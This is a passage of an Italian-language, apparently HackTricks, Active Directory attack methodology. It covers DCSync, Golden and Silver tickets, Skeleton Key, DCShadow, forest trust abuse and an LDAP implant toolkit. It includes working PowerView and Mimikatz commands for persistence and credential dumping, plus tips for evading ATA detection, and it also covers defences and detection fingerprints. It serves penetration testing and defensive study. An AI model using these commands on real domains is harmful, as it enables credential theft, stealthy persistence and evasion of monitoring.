**LAPS** fornisce un sistema per gestire la **password dell'Administrator locale** sui computer uniti al dominio, garantendo che sia **randomizzata**, unica e frequentemente **modificata**. Queste password sono archiviate in Active Directory e l'accesso è controllato tramite ACL solo per gli utenti autorizzati. Con privilegi sufficienti per accedere a queste password, diventa possibile fare pivot verso altri computer.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Raccogliere certificati** dalla macchina compromessa potrebbe essere un modo per escalare privilegi all'interno dell'ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Se sono configurati **template vulnerabili** è possibile abusarne per escalare privilegi:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Una volta ottenuti privilegi **Domain Admin** o, ancora meglio, **Enterprise Admin**, puoi **fare dump** del **database del dominio**: _ntds.dit_.

[**Ulteriori informazioni sull'attack DCSync sono disponibili qui**](dcsync.md).

[**Ulteriori informazioni su come rubare NTDS.dit sono disponibili qui**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Alcune delle tecniche discusse prima possono essere usate per la persistenza.\
Per esempio potresti:

- Rendere gli utenti vulnerabili a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Rendere gli utenti vulnerabili a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Concedere privilegi [**DCSync**](#dcsync) a un utente

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

L'**Silver Ticket attack** crea un **Ticket Granting Service (TGS)** legittimo per un servizio specifico usando l'**hash NTLM** (per esempio, l'**hash dell'account del PC**). Questo metodo viene usato per **accedere ai privilegi del servizio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un **Golden Ticket attack** implica che un attacker ottenga l'accesso all'**hash NTLM dell'account krbtgt** in un ambiente Active Directory (AD). Questo account è speciale perché viene usato per firmare tutti i **Ticket Granting Tickets (TGTs)**, essenziali per l'autenticazione nella rete AD.

Una volta ottenuto questo hash, l'attacker può creare **TGTs** per qualsiasi account scelga (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Sono come golden tickets forgiati in modo da **bypassare i comuni meccanismi di rilevamento dei golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Avere i certificati di un account o poterli richiedere** è un ottimo modo per riuscire a persistere nell'account dell'utente (anche se cambia la password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Usare i certificati consente anche di persistere con privilegi elevati all'interno del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

L'oggetto **AdminSDHolder** in Active Directory garantisce la sicurezza dei **gruppi privilegiati** (come Domain Admins e Enterprise Admins) applicando una **Access Control List (ACL)** standard a questi gruppi per impedire modifiche non autorizzate. Tuttavia, questa funzionalità può essere abusata; se un attacker modifica l'ACL di AdminSDHolder per dare pieno accesso a un utente normale, quell'utente ottiene un controllo esteso su tutti i gruppi privilegiati. Questa misura di sicurezza, pensata per proteggere, può quindi ritorcersi contro, consentendo accessi non dovuti se non viene monitorata attentamente.

[**Ulteriori informazioni sul gruppo AdminDSHolder qui.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

All'interno di ogni **Domain Controller (DC)** esiste un account di **local administrator**. Ottenendo diritti admin su una macchina del genere, l'hash dell'Administrator locale può essere estratto usando **mimikatz**. Dopo di ciò, è necessaria una modifica del registry per **abilitare l'uso di questa password**, consentendo l'accesso remoto all'account Administrator locale.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Potresti **assegnare** alcuni **privilegi speciali** a un **utente** su alcuni specifici oggetti di dominio che permetteranno all'utente di **escalare privilegi in futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

I **security descriptors** sono usati per **memorizzare** i **permessi** che un **oggetto** ha **su** un altro **oggetto**. Se riesci a **fare** solo una **piccola modifica** nel **security descriptor** di un oggetto, puoi ottenere privilegi molto interessanti su quell'oggetto senza dover essere membro di un gruppo privilegiato.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abusa della classe ausiliaria `dynamicObject` per creare principal/GPO/record DNS di breve durata con `entryTTL`/`msDS-Entry-Time-To-Die`; si autoeliminano senza tombstone, cancellando le evidenze LDAP mentre lasciano SID orfani, riferimenti `gPLink` rotti o risposte DNS in cache (per esempio, inquinamento ACE di AdminSDHolder o redirect malevoli `gPCFileSysPath`/DNS integrato in AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Modifica **LSASS** in memoria per stabilire una **password universale**, garantendo l'accesso a tutti gli account del dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Scopri qui cos'è uno SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puoi creare il tuo **SSP** per **catturare** in **clear text** le **credenziali** usate per accedere alla macchina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuovo Domain Controller** nell'AD e lo usa per **pushare attributi** (SIDHistory, SPNs...) su oggetti specificati **senza** lasciare alcun **log** relativo alle **modifiche**. Hai **bisogno di privilegi DA** e devi essere nel **root domain**.\
Nota che se usi dati errati, appariranno log decisamente brutti.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

In precedenza abbiamo parlato di come escalare privilegi se hai **permessi sufficienti per leggere le password LAPS**. Tuttavia, queste password possono anche essere usate per **mantenere la persistenza**.\
Controlla:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considera la **Forest** come il perimetro di sicurezza. Questo implica che **compromettere un singolo domain potrebbe potenzialmente portare alla compromissione dell'intera Forest**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) è un meccanismo di sicurezza che consente a un utente di un **domain** di accedere a risorse in un altro **domain**. In sostanza crea un collegamento tra i sistemi di autenticazione dei due domain, consentendo alle verifiche di autenticazione di fluire senza interruzioni. Quando i domain configurano un trust, si scambiano e conservano specifiche **chiavi** nei rispettivi **Domain Controllers (DCs)**, che sono cruciali per l'integrità del trust.

In uno scenario tipico, se un utente vuole accedere a un servizio in un **trusted domain**, deve prima richiedere un ticket speciale noto come **inter-realm TGT** dal DC del proprio domain. Questo TGT è cifrato con una **chiave** condivisa che entrambi i domain hanno concordato. L'utente poi presenta questo TGT al **DC del trusted domain** per ottenere un service ticket (**TGS**). Dopo la validazione riuscita dell'inter-realm TGT da parte del DC del trusted domain, viene emesso un TGS, concedendo all'utente l'accesso al servizio.

**Passaggi**:

1. Un **client computer** nel **Domain 1** avvia il processo usando il proprio **hash NTLM** per richiedere un **Ticket Granting Ticket (TGT)** al suo **Domain Controller (DC1)**.
2. DC1 emette un nuovo TGT se il client viene autenticato con successo.
3. Il client quindi richiede un **inter-realm TGT** a DC1, necessario per accedere alle risorse nel **Domain 2**.
4. L'inter-realm TGT è cifrato con una **trust key** condivisa tra DC1 e DC2 come parte del domain trust bidirezionale.
5. Il client porta l'inter-realm TGT al **Domain Controller (DC2) del Domain 2**.
6. DC2 verifica l'inter-realm TGT usando la chiave di trust condivisa e, se valido, emette un **Ticket Granting Service (TGS)** per il server nel Domain 2 che il client vuole accedere.
7. Infine, il client presenta questo TGS al server, che è cifrato con l'hash dell'account del server, per ottenere accesso al servizio nel Domain 2.

### Different trusts

È importante notare che **un trust può essere a 1 via o a 2 vie**. Nell'opzione a 2 vie, entrambi i domain si fidano l'uno dell'altro, ma nella relazione di trust **a 1 via** uno dei domain sarà il **trusted** e l'altro il domain **trusting**. Nell'ultimo caso, **sarà possibile accedere alle risorse all'interno del domain trusting solo dal trusted one**.

Se Domain A si fida di Domain B, A è il domain trusting e B quello trusted. Inoltre, in **Domain A**, questo sarebbe un **Outbound trust**; e in **Domain B**, questo sarebbe un **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Questa è una configurazione comune all'interno dello stesso forest, dove un child domain ha automaticamente un trust transitive bidirezionale con il suo parent domain. In sostanza, ciò significa che le richieste di autenticazione possono fluire senza problemi tra il parent e il child.
- **Cross-link Trusts**: Chiamati "shortcut trusts", sono stabiliti tra child domains per accelerare i processi di referral. In forest complesse, i referral di autenticazione devono in genere risalire fino alla forest root e poi scendere fino al domain di destinazione. Creando cross-link, il percorso si accorcia, il che è particolarmente utile in ambienti geograficamente dispersi.
- **External Trusts**: Sono configurati tra domain diversi e non correlati e sono per loro natura non transitive. Secondo la [documentazione di Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), gli external trust sono utili per accedere a risorse in un domain esterno all'attuale forest che non è collegato da un forest trust. La sicurezza è rafforzata tramite SID filtering con gli external trust.
- **Tree-root Trusts**: Questi trust vengono stabiliti automaticamente tra il forest root domain e un nuovo tree root aggiunto. Sebbene non siano comunemente incontrati, i tree-root trust sono importanti per aggiungere nuovi domain tree a un forest, consentendo loro di mantenere un domain name unico e garantendo la transitive bidirezionale. Ulteriori informazioni si trovano nella [guida di Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Questo tipo di trust è un trust transitive bidirezionale tra due forest root domain, che applica anche il SID filtering per rafforzare le misure di sicurezza.
- **MIT Trusts**: Questi trust vengono stabiliti con domain Kerberos non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120). I MIT trust sono un po' più specializzati e si rivolgono ad ambienti che richiedono integrazione con sistemi basati su Kerberos al di fuori dell'ecosistema Windows.

#### Other differences in **trusting relationships**

- Una trust relationship può anche essere **transitive** (A si fida di B, B si fida di C, allora A si fida di C) oppure **non-transitive**.
- Una trust relationship può essere configurata come **bidirectional trust** (entrambi si fidano l'uno dell'altro) oppure come **one-way trust** (solo uno dei due si fida dell'altro).

### Attack Path

1. **Enumerate** le trusting relationships
2. Verifica se qualche **security principal** (user/group/computer) ha **accesso** alle risorse dell'**altro domain**, magari tramite entry ACE o perché è in gruppi dell'altro domain. Cerca **relationships across domains** (il trust è stato creato probabilmente per questo).
1. kerberoast in questo caso potrebbe essere un'altra opzione.
3. **Comprometti** gli **account** che possono **pivotare** tra domain.

Attacker con accesso alle risorse in un altro domain tramite tre meccanismi principali:

- **Local Group Membership**: I principal potrebbero essere aggiunti a gruppi locali sulle macchine, come il gruppo “Administrators” su un server, ottenendo così un controllo significativo su quella macchina.
- **Foreign Domain Group Membership**: I principal possono anche essere membri di gruppi all'interno del foreign domain. Tuttavia, l'efficacia di questo metodo dipende dalla natura del trust e dall'ambito del gruppo.
- **Access Control Lists (ACLs)**: I principal potrebbero essere specificati in un **ACL**, in particolare come entità in **ACEs** all'interno di un **DACL**, fornendo loro accesso a risorse specifiche. Per chi vuole approfondire i meccanismi di ACLs, DACLs e ACEs, il whitepaper intitolato “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” è una risorsa preziosa.

### Find external users/groups with permissions

Puoi controllare **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** per trovare foreign security principals nel domain. Questi saranno user/group di **un domain/forest esterno**.

Puoi verificarlo in **Bloodhound** o usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalatione di privilegi da Child a Parent forest
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Altri modi per enumerare i trust di dominio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Ci sono **2 trusted keys**, una per _Child --> Parent_ e un’altra per _Parent_ --> _Child_.\
> Puoi usare quella usata dal dominio corrente con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalare a Enterprise admin nel dominio child/parent abusando della trust con SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Capire come la Configuration Naming Context (NC) può essere sfruttata è fondamentale. La Configuration NC serve come repository centrale per i dati di configurazione in tutti i forest negli ambienti Active Directory (AD). Questi dati vengono replicati su ogni Domain Controller (DC) all’interno del forest, con i DC scrivibili che mantengono una copia scrivibile della Configuration NC. Per sfruttarla, bisogna avere **privilegi SYSTEM su un DC**, preferibilmente un child DC.

**Link GPO to root DC site**

Il container Sites della Configuration NC include informazioni sui site di tutti i computer joined al dominio all’interno del forest AD. Operando con privilegi SYSTEM su qualsiasi DC, gli attacker possono collegare GPO ai site del root DC. Questa azione può compromettere il root domain manipolando le policy applicate a questi site.

Per informazioni approfondite, si può esplorare la ricerca su [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vettore di attacco consiste nel prendere di mira gMSA privilegiati all’interno del dominio. La KDS Root key, essenziale per calcolare le password delle gMSA, è memorizzata nella Configuration NC. Con privilegi SYSTEM su qualsiasi DC, è possibile accedere alla KDS Root key e calcolare le password di qualsiasi gMSA in tutto il forest.

Analisi dettagliata e guida passo passo si trovano in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attacco complementare delegated MSA (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ricerca esterna aggiuntiva: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Questo metodo richiede pazienza, aspettando la creazione di nuovi oggetti AD privilegiati. Con privilegi SYSTEM, un attacker può modificare lo Schema AD per concedere a qualsiasi user il controllo completo su tutte le classi. Questo potrebbe portare ad accesso non autorizzato e controllo sui nuovi oggetti AD creati.

Ulteriori letture sono disponibili su [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnerabilità ADCS ESC5 prende di mira il controllo sugli oggetti Public Key Infrastructure (PKI) per creare un certificate template che consente l’autenticazione come qualsiasi user all’interno del forest. Poiché gli oggetti PKI risiedono nella Configuration NC, compromettere un child DC scrivibile abilita l’esecuzione di attacchi ESC5.

Ulteriori dettagli si possono leggere in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenari senza ADCS, l’attacker ha la capacità di configurare i componenti necessari, come discusso in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In questo scenario **il tuo domain è trusted** da uno esterno, dandoti **permessi indeterminati** su di esso. Dovrai scoprire **quali principal del tuo domain hanno quale accesso sul domain esterno** e poi provare a sfruttarlo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In questo scenario **your domain** sta **concedendo** alcuni **privileges** a principal provenienti da **different domains**.

Tuttavia, quando un **domain is trusted** dal trusting domain, il trusted domain **crea un user** con un **nome prevedibile** che usa come **password the trusted password**. Questo significa che è possibile **accedere a un user from the trusting domain to get inside the trusted one** per enumerarlo e provare a elevare altri privilegi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Un altro modo per compromettere il trusted domain è trovare un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creato nella **direzione opposta** della domain trust (cosa non molto comune).

Un altro modo per compromettere il trusted domain è aspettare in una macchina dove un **user from the trusted domain can access** di fare login via **RDP**. Poi, l'attacker potrebbe iniettare codice nel processo della sessione RDP e **access the origin domain of the victim** da lì.\
Inoltre, se la **victim mounted his hard drive**, dal processo della **RDP session** l'attacker potrebbe salvare **backdoors** nella **startup folder of the hard drive**. Questa tecnica si chiama **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Il rischio di attacchi che sfruttano l'attributo SID history attraverso forest trusts viene mitigato da SID Filtering, che è attivato di default su tutti gli inter-forest trusts. Questo si basa sull'assunzione che gli intra-forest trusts siano sicuri, considerando il forest, piuttosto che il domain, come security boundary secondo la posizione di Microsoft.
- Tuttavia, c'è un problema: SID filtering potrebbe interrompere applicazioni e accesso degli utenti, portando alla sua disattivazione occasionale.

### **Selective Authentication:**

- Per gli inter-forest trusts, l'uso di Selective Authentication garantisce che gli utenti dei due forest non vengano autenticati automaticamente. Invece, sono necessari permessi espliciti affinché gli utenti possano accedere a domains e servers all'interno del trusting domain o forest.
- È importante notare che queste misure non proteggono dallo sfruttamento del writable Configuration Naming Context (NC) o da attacchi sull'account del trust.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolve short names/OU paths into full DNs and dump the corresponding objects.
- `get-object`, `get-attribute`, and `get-domaininfo` pull arbitrary attributes (including security descriptors) plus the forest/domain metadata from `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expose roasting candidates, delegation settings, and existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors directly from LDAP.
- `get-acl` and `get-writable --detailed` parse the DACL to list trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), and inheritance, giving immediate targets for ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitive LDAP di scrittura per escalation & persistence

- I BOF di creazione oggetti (`add-user`, `add-computer`, `add-group`, `add-ou`) permettono all’operatore di predisporre nuovi principal o account macchina ovunque esistano diritti su OU. `add-groupmember`, `set-password`, `add-attribute`, e `set-attribute` dirottano direttamente i target una volta trovati i diritti di write-property.
- I comandi incentrati su ACL come `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, e `add-dcsync` trasformano WriteDACL/WriteOwner su qualsiasi oggetto AD in reset di password, controllo della membership dei gruppi, o privilegi di replica DCSync senza lasciare artefatti PowerShell/ADSI. I corrispondenti `remove-*` puliscono le ACE iniettate.

### Delegation, roasting, e abuso di Kerberos

- `add-spn`/`set-spn` rendono subito Kerberoastable un utente compromesso; `add-asreproastable` (toggle UAC) lo marca per AS-REP roasting senza toccare la password.
- Le macro di delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) riscrivono `msDS-AllowedToDelegateTo`, i flag UAC, o `msDS-AllowedToActOnBehalfOfOtherIdentity` dal beacon, abilitando i percorsi di attacco constrained/unconstrained/RBCD ed eliminando la necessità di remote PowerShell o RSAT.

### sidHistory injection, spostamento di OU, e modellazione della superficie d’attacco

- `add-sidhistory` inietta SID privilegiati nella sid history di un principal controllato (vedi [SID-History Injection](sid-history-injection.md)), fornendo ereditarietà di accesso stealth completamente via LDAP/LDAPS.
- `move-object` cambia il DN/OU di computer o utenti, permettendo a un attaccante di trascinare gli asset in OU dove esistono già diritti delegati prima di abusare di `set-password`, `add-groupmember`, o `add-spn`.
- I comandi di rimozione a scopo mirato (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ecc.) permettono un rollback rapido dopo che l’operatore ha raccolto credenziali o persistence, riducendo al minimo la telemetria.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Alcune difese generali

[**Scopri di più su come proteggere le credenziali qui.**](../stealing-credentials/credentials-protections.md)

### **Misure difensive per la protezione delle credenziali**

- **Restrizioni per i Domain Admins**: si raccomanda che i Domain Admins possano fare login solo sui Domain Controllers, evitando il loro uso su altri host.
- **Privilegi degli account di servizio**: i servizi non dovrebbero essere eseguiti con privilegi di Domain Admin (DA) per mantenere la sicurezza.
- **Limitazione temporale dei privilegi**: per le attività che richiedono privilegi DA, la loro durata dovrebbe essere limitata. Questo può essere ottenuto con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigazione LDAP relay**: audit degli Event ID 2889/3074/3075 e poi imporre LDAP signing più channel binding LDAPS sui DC/client per bloccare tentativi LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting a livello di protocollo dell’attività di Impacket

Se vuoi rilevare il comune tradecraft AD, **non fare affidamento solo sugli artefatti controllati dall’operatore** come binari rinominati, nomi di servizio, file batch temporanei o path di output. Crea una baseline di come i client Windows legittimi costruiscono traffico [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, e WMI, poi cerca **particolarità di implementazione** che restano anche dopo che l’operatore modifica `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, o `ntlmrelayx.py`.

- **Candidate standalone ad alta confidenza** (dopo la validazione contro la tua baseline):
- DCE/RPC autenticato con `auth_context_id = 79231 + ctx_id`
- Padding di autenticazione DCE/RPC riempito con `0xff`
- LDAP Kerberos bind che inseriscono un `AP-REQ` Kerberos grezzo direttamente nel `mechToken` di SPNEGO
- Richieste SMB2/3 negotiate con valori `ClientGuid` che sembrano ASCII
- WMI `IWbemLevel1Login::NTLMLogin` che usa il namespace non standard `//./root/cimv2`
- Valori nonce Kerberos hardcoded
- **Meglio come feature di correlazione/scoring**:
- Liste etype Kerberos sparse o duplicate, `PA-DATA` insoliti/mancanti, oppure ordinamento degli etype nelle TGS-REQ diverso da Windows nativo
- Messaggi NTLM Type 1 senza info di versione o messaggi Type 3 con nomi host nulli
- NTLMSSP grezzo trasportato in DCE/RPC invece che in SPNEGO, trailer di verifica DCE/RPC mancanti, o mismatch degli OID SPNEGO/Kerberos
- Diverse di queste tracce dallo stesso host/utente/sessione/finestra temporale sono molto più forti di qualsiasi singolo campo debole
- **Da usare come enrichment, non come alert standalone**:
- Nomi file predefiniti, path di output, nomi di servizio casuali, nomi di batch temporanei, nomi di account computer predefiniti, e stringhe HTTP/WebDAV/RDP/MSSQL specifiche del tool
- Sono facili da cambiare per l’operatore e sono meglio usati per spiegare perché un cluster cross-protocol è sospetto
- **Note operative**:
- Alcuni di questi segnali richiedono traffico decifrato, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, o visibilità lato servizio
- Valida contro client Samba/Linux, appliance, e software legacy prima di promuoverli ad alert
- Promuovi le detection da enrichment -> hunting -> alerting man mano che costruisci fiducia nella baseline

### **Implementing Deception Techniques**

- Implementing deception involves setting traps, like decoy users or computers, with features such as passwords that do not expire or are marked as Trusted for Delegation. A detailed approach includes creating users with specific rights or adding them to high privilege groups.
- A practical example involves using tools like: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- More on deploying deception techniques can be found at [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Suspicious indicators include atypical ObjectSID, infrequent logons, creation dates, and low bad password counts.
- **General Indicators**: Comparing attributes of potential decoy objects with those of genuine ones can reveal inconsistencies. Tools like [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) can assist in identifying such deceptions.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Avoiding session enumeration on Domain Controllers to prevent ATA detection.
- **Ticket Impersonation**: Utilizing **aes** keys for ticket creation helps evade detection by not downgrading to NTLM.
- **DCSync Attacks**: Executing from a non-Domain Controller to avoid ATA detection is advised, as direct execution from a Domain Controller will trigger alerts.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11ee)

{{#include ../../banners/hacktricks-training.md}}
